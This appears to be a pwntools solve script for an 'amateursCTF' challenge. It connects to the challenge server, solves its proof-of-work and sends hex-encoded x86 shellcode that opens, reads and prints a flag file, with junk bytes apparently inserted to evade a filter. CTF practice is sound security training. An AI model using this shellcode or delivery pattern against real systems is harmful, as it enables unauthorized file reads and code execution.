#!/usr/bin/env python3
from pwn import *
import base64, re

def solve_pwn_red_pow(challenge):
    parts = challenge.split('.')
    difficulty = int.from_bytes(base64.b64decode(parts[1]), 'big')
    challenge_bytes = base64.b64decode(parts[2])
    mod = (1 << 1279) - 1
    exp = 1 << 1277
    x = int.from_bytes(challenge_bytes, 'big')
    for _ in range(difficulty):
        x = pow(x, exp, mod)
        x ^= 1
    return 's.' + base64.b64encode(x.to_bytes((x.bit_length() + 7) // 8, 'big')).decode()

payload = "b86970330180008d40800040b89170330180008d40800040b8b970330180008d40800040b8cd70330180008d408000406867676767812c246767670068616c662f687070612f687672732f89e3b805000000b900000000ba00000000e90300000040484048404089c3b80300000089e1ba64000000e912000000404840484048404840484048404840484048404089c2b804000000bb01000000e915000000404840484048404840484048404840484048404840484040b801000000bb00000000e90200000040484040e9f9ffffff"

log.info("Connecting...")
io = remote('amt.rs', 57207)

pow_data = io.recvuntil(b'solution: ').decode()
solution = solve_pwn_red_pow(re.search(r's\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+', pow_data).group(0))
io.sendline(solution.encode())
log.success("PoW solved")

io.recvuntil(b'shellcode: ')
io.sendline(payload.encode())
log.success("Shellcode sent!")

log.info("Receiving output...")
output = io.recvall(timeout=10)

print("\n" + "="*70)
print("OUTPUT:")
print("="*70)
print(output.decode(errors='ignore'))
print("="*70)

flags = re.findall(r'amateursCTF\{[^}]+\}', output.decode(errors='ignore'))
if flags:
    print("\n" + "*"*70)
    print("FLAG FOUND:")
    print("*"*70)
    print(flags[0])
    print("*"*70)
else:
    print("\nNo flag found in output")

io.close()
